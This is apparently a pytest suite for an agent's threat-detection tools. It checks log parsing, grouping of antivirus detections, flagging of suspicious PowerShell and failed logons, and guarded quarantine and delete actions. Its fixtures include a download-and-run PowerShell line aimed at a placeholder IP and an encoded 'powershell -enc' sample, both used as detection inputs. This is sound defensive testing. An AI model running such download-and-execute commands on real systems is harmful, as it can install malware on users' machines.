"""Endpoint threat detection on the agent: reading the logs, grouping, the scan file, and the approved actions."""

import json
from pathlib import Path

import pytest

from agent.toolkit import get_tool, leftovers, threats, updates

KES_302 = """Event type: Malicious object detected
User: CORP\\alice (Initiator)
Component: Malware Scan
Result description: Detected
Type: Trojan
Name: {name}
Threat level: Heuristic analysis
Precision: High
Object type: File
Path to object: {path}//ISO9660\\POOL\\NON_FRE0\\W\\WINDOWS_.DEB//data.tar.xz//data.tar//./usr/share/windows-resources/binaries
Object name: {object}
Reason: Machine learning
Database release date: 10/20/2026 6:04:00 PM
SHA256: 7C9FBECC1C81CF501709029B0DF80A201519ACD6445FCC66EA66108919120E20
MD5: 1E447B068D464B4D3BB9096BA2B7614F"""


@pytest.fixture
def device(tmp_path, monkeypatch):
    monkeypatch.setenv("AIOPS_AGENT_DATA", str(tmp_path / "agent-data"))
    (tmp_path / "agent-data").mkdir()
    monkeypatch.setattr(threats, "os_name", lambda: "Windows")
    monkeypatch.setattr(threats, "is_admin", lambda: True)
    iso = tmp_path / "Downloads" / "kali-linux-installer-amd64.iso"
    iso.parent.mkdir()
    iso.write_bytes(b"not really an iso")
    return tmp_path, iso


def windows_logs(iso, detections=606):
    names = ["HEUR:Backdoor.Win32.Poison.gen", "HEUR:HackTool.Win32.Generic", "not-a-virus:RemoteAdmin.Win32.VNC"]
    events = [{"src": "kes", "id": 302, "t": f"2026-10-20T18:{28 + index % 30:02d}:45.1234567+05:00",
               "text": KES_302.format(name=names[index % 3], path=iso, object=f"tool{index}.exe")} for index in range(detections)]
    events += [
        {"src": "kes", "id": 2072, "t": "2026-10-23T10:00:00.0000000+05:00", "text": "Current usage status of Kaspersky Security Network ID[83A6]: disabled."},
        {"src": "kes", "id": 217, "t": "2026-10-23T21:58:49.0000000+05:00", "text": "Event type: Report cleared\nName: avpui.exe\nApplication path: C:\\Program Files (x86)\\Kaspersky Lab\\KES.12.10.0\nUser: CORP\\alice (Initiator)\nComponent: Protection\nObject: Backup"},
        {"src": "defender", "id": 5001, "t": "2026-10-22T09:00:00.0000000+05:00", "f": {}},
        {"src": "kel", "id": 3, "provider": "klnagent", "count": 1417, "t": "2026-10-23T12:00:00.0000000+05:00", "first": "2026-10-20T12:00:00.0000000+05:00", "text": "Transport error: cannot connect to the Administration Server"},
        {"src": "security", "id": 4732, "t": "2026-10-22T11:00:00.0000000+05:00", "f": {"MemberName": "CN=bob", "TargetUserName": "Administrators", "SubjectUserName": "alice"}},
        {"src": "system", "id": 7045, "t": "2026-10-22T11:05:00.0000000+05:00", "f": {"ServiceName": "updsvc", "ImagePath": "C:\\Users\\alice\\AppData\\Roaming\\upd.exe", "AccountName": "LocalSystem"}},
        {"src": "powershell", "id": 4104, "t": "2026-10-22T11:06:00.0000000+05:00", "f": {"ScriptBlockText": "(New-Object Net.WebClient).DownloadFile('http://203.0.113.5/a.exe', 'a.exe')", "Path": ""}},
        {"src": "powershell", "id": 4104, "t": "2026-10-22T11:07:00.0000000+05:00", "f": {"ScriptBlockText": "$__cmdletization_objectModelWrapper.EndProcessing()", "Path": ""}},
    ]
    events += [{"src": "security", "id": 4625, "t": f"2026-10-22T03:{minute:02d}:00.0000000+05:00",
                "f": {"TargetUserName": "admin", "TargetDomainName": "PC1", "IpAddress": "203.0.113.9", "LogonType": "10"}} for minute in range(12)]
    sources = [{"name": "Kaspersky Endpoint Security", "log": "Kaspersky Endpoint Security", "available": True, "count": detections + 2, "detail": ""},
               {"name": "Windows Security log", "log": "Security", "available": True, "count": 13, "detail": ""}]
    antivirus = [{"name": "Windows Defender", "enabled": False, "up_to_date": True}, {"name": "Kaspersky Endpoint Security for Windows", "enabled": True, "up_to_date": True}]
    return {"sources": sources, "events": events, "antivirus": antivirus}


def scan(monkeypatch, iso, **kwargs):
    raw = windows_logs(iso, **kwargs)
    monkeypatch.setattr(updates, "_powershell_json", lambda script, timeout: raw)
    return threats.threat_scan(168)


def test_kaspersky_event_text_becomes_fields():
    fields = threats.parse_kaspersky(KES_302.format(name="HEUR:Backdoor.Win32.Poison.gen", path="C:\\Users\\alice\\Downloads\\kali.iso", object="vncviewer.exe"))
    assert fields["Event type"] == "Malicious object detected" and fields["Result description"] == "Detected"
    assert fields["Path to object"].startswith("C:\\Users\\alice\\Downloads\\kali.iso//ISO9660")  # the drive's colon stays in the value
    assert fields["Database release date"] == "10/20/2026 6:04:00 PM"
    outer, inner = threats.split_container(fields["Path to object"], fields["Object name"])
    assert outer == "C:\\Users\\alice\\Downloads\\kali.iso" and inner.endswith("binaries/vncviewer.exe")
    assert threats.split_container("C:\\x\\archive.zip->inner/evil.exe") == ("C:\\x\\archive.zip", "inner/evil.exe")


def test_606_detections_inside_one_iso_are_one_item_with_its_proof(device, monkeypatch):
    tmp_path, iso = device
    result = scan(monkeypatch, iso)
    assert result["ok"]
    data = result["data"]
    malware = [item for item in data["items"] if item["kind"] == "malware"]
    assert len(malware) == 1
    item = malware[0]
    assert item["count"] == 606 and item["path"] == str(iso) and item["on_disk"] is True and item["size"] == iso.stat().st_size
    assert len(item["objects"]) == threats.MAX_OBJECTS and item["fields"]["Result"] == "Detected"
    assert [entry["count"] for entry in item["threats"]] == [202, 202, 202]
    assert item["fields"]["SHA256"].startswith("7C9F") and item["fields"]["User"] == "CORP\\alice (Initiator)"
    assert item["first_seen"] < item["last_seen"]
    kinds = {entry["kind"] for entry in data["items"]}
    assert {"av_health", "av_report_cleared", "av_disabled", "group_member_added", "service_installed", "powershell_suspicious", "failed_logon"} <= kinds
    # Only the download-and-run script is suspicious, not the Windows module PowerShell flags as well.
    powershell = [entry for entry in data["items"] if entry["kind"] == "powershell_suspicious"]
    assert len(powershell) == 1 and "DownloadFile" in powershell[0]["fields"]["Attack signs"]
    logons = next(entry for entry in data["items"] if entry["kind"] == "failed_logon")
    assert logons["count"] == 12 and logons["peak_per_hour"] == 12 and logons["fields"]["Logon type"] == "remote desktop (RDP)"
    assert next(entry for entry in data["items"] if entry["kind"] == "av_health" and entry["source"] == "Kaspersky Network Agent")["count"] == 1417
    assert data["items"][0]["kind"] == "malware" and data["items"][0]["id"] == "d0"
    # The scan file holds the paths actions may touch: the server only ever sends its id and an item id.
    scan_file = Path(tmp_path, "agent-data", "threat-scans", f"{data['scan_id']}.json")
    assert json.loads(scan_file.read_text())["items"][0] == {"id": "d0", "kind": "malware", "path": str(iso), "name": item["fields"]["Threat"]}
    assert "606 malware detection(s) in 1 file(s), 1 still on disk" in result["summary"]


def test_a_huge_scan_stays_under_the_task_result_cap(device, monkeypatch):
    _, iso = device
    raw = windows_logs(iso, detections=50)
    raw["events"] += [{"src": "security", "id": 4625, "t": "2026-10-22T03:00:00.0000000+05:00", "f": {"TargetUserName": f"user{index}", "IpAddress": f"198.51.100.{index % 250}", "LogonType": "3", "WorkstationName": "W" * 200}}
                      for index in range(3000)]
    monkeypatch.setattr(updates, "_powershell_json", lambda script, timeout: raw)
    data = threats.threat_scan(168)["data"]
    assert len(json.dumps(data)) <= threats.DATA_LIMIT and len(data["items"]) <= threats.MAX_ITEMS
    assert data["items"][0]["kind"] == "malware"  # the least urgent items are the ones cut


def test_an_unreadable_log_is_reported_never_shown_as_clean(device, monkeypatch):
    _, iso = device
    raw = windows_logs(iso, detections=1)
    raw["sources"][1] = {"name": "Windows Security log", "log": "Security", "available": False, "count": 0, "detail": "access denied: the agent must run as SYSTEM or an administrator"}
    monkeypatch.setattr(updates, "_powershell_json", lambda script, timeout: raw)
    result = threats.threat_scan(168)
    assert "Not readable: Windows Security log: access denied" in result["summary"]


def test_the_scan_script_itself_has_no_attack_words():
    """The antivirus scans every PowerShell script (AMSI): attack words in ours made Kaspersky block the agent."""
    assert threats.powershell_attack_signs(threats.WINDOWS_SCRIPT) == []
    assert threats.powershell_attack_signs("irm 'http://aiops/install/windows.ps1?server=x' | iex") == []  # AIops' own install
    assert threats.powershell_attack_signs("powershell -enc " + "QQBBAEEA" * 8)


def test_quarantine_moves_the_file_and_the_software_tab_restores_it(device, monkeypatch):
    tmp_path, iso = device
    data = scan(monkeypatch, iso)["data"]
    assert threats.quarantine_threat("0" * 12, "d0")["summary"].startswith("That threat scan expired or is unknown")
    assert threats.quarantine_threat(data["scan_id"], "d99")["ok"] is False
    assert threats.quarantine_threat(data["scan_id"], "../../x")["summary"] == "Invalid scan or item id"
    result = threats.quarantine_threat(data["scan_id"], "d0")
    assert result["ok"] and result["changed"] and not iso.exists()
    stored = next(Path(tmp_path, "agent-data", "quarantine").glob("*/d0_*.quarantined"))
    assert stored.read_bytes() == b"not really an iso" and result["data"]["sha256"]
    listed = leftovers.list_quarantine()["data"]["batches"]
    assert listed[0]["program"].startswith("Threat: ") and listed[0]["paths"] == [str(iso)]
    restored = leftovers.restore_quarantine(result["data"]["batch_id"])
    assert restored["ok"] and iso.read_bytes() == b"not really an iso"


def test_actions_refuse_protected_folders_folders_and_missing_files(device, monkeypatch):
    tmp_path, iso = device
    data = scan(monkeypatch, iso)["data"]
    monkeypatch.setattr(threats, "_protected_roots", lambda: [leftovers._norm_path(iso.parent)])
    assert "protected folder" in threats.quarantine_threat(data["scan_id"], "d0")["summary"] and iso.exists()
    assert "protected folder" in threats.delete_threat(data["scan_id"], "d0", iso.name)["summary"] and iso.exists()
    monkeypatch.setattr(threats, "_protected_roots", lambda: [])
    iso.unlink()
    iso.mkdir()  # the file was replaced by a folder of the same name
    assert "no longer there" in threats.quarantine_threat(data["scan_id"], "d0")["summary"]


def test_delete_needs_the_file_name_typed(device, monkeypatch):
    _, iso = device
    data = scan(monkeypatch, iso)["data"]
    assert "confirmation must be the file name" in threats.delete_threat(data["scan_id"], "d0", "yes")["summary"] and iso.exists()
    result = threats.delete_threat(data["scan_id"], "d0", iso.name.upper())  # Windows names are not case-sensitive
    assert result["ok"] and not iso.exists() and result["data"]["sha256"]


def test_rescan_asks_kaspersky_for_a_report_only_scan(device, monkeypatch):
    _, iso = device
    data = scan(monkeypatch, iso)["data"]
    calls = []
    monkeypatch.setattr(threats, "_kaspersky_cli", lambda: "C:\\KES\\avp.com")
    monkeypatch.setattr(threats, "_run", lambda command, timeout: calls.append(command) or (0, "Detected: 3\nScan completed", ""))
    result = threats.threat_rescan(data["scan_id"], "d0")
    assert calls == [["C:\\KES\\avp.com", "SCAN", str(iso), "/i0"]]
    assert result["ok"] and "3 detection(s) reported" in result["summary"] and "nothing was changed" in result["summary"]


def test_the_tools_are_registered_with_the_right_risk():
    assert get_tool("threat_scan").risk == "read" and get_tool("threat_scan").ai_visible
    assert get_tool("threat_rescan").risk == "low"
    assert get_tool("quarantine_threat").risk == "high" and get_tool("delete_threat").risk == "high"
    assert not any(get_tool(name).ai_visible for name in ("threat_rescan", "quarantine_threat", "delete_threat"))


def test_linux_auth_lines_become_sign_in_findings(monkeypatch):
    groups = threats._Groups()
    for _ in range(6):
        threats._add_auth_line(groups, "Failed password for invalid user oracle from 198.51.100.7 port 4242 ssh2", None, "Auth log")
    threats._add_auth_line(groups, "usermod[999]: add 'mallory' to group 'sudo'", None, "Auth log")
    threats._add_auth_line(groups, "useradd[998]: new user: name=mallory, UID=1001, GID=1001", None, "Auth log")
    items = {item["kind"]: item for item in groups.finish()}
    assert items["failed_logon"]["count"] == 6 and items["failed_logon"]["fields"]["Source address"] == "198.51.100.7"
    assert items["group_member_added"]["fields"] == {"Member": "mallory", "Group": "sudo"}
    assert items["user_created"]["fields"]["New account"] == "mallory"
